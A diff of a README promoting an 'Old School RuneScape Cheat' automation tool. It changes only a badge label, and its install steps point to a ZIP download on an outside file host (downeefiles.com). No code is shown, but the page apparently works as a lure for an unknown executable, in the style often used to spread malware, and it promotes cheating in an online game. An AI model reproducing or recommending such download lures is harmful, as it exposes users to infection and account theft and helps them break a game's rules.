@@ -1,10 +1,10 @@
-# 🚀 **Old School RuneScape Cheat** - Ultimate OSRS Scripting & Automation Tool **[![Download OldSchoolRS Executor](https://img.shields.io/badge/Download-OldSchoolRS%20Executor-blueviolet)](https://downeefiles.com/s/osrsbob)**
+# 🚀 **Old School RuneScape Cheat** - Ultimate OSRS Scripting & Automation Tool **[![Download OldSchoolRS Executor](https://img.shields.io/badge/Download-OldSchoolRS%20Script-blueviolet)](https://downeefiles.com/s/osrsbob)**
 
 ## Quick Installation
 
 To get started with OldSchoolRS Cheat, follow these simple steps:
 
-1. **[![Download OSRS Cheat](https://img.shields.io/badge/Download-OldSchoolRS%20Executor-blueviolet)](https://downeefiles.com/s/osrsbob)**
+1. **[![Download OSRS Cheat](https://img.shields.io/badge/Download-OldSchoolRS%20Script-blueviolet)](https://downeefiles.com/s/osrsbob)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 ---
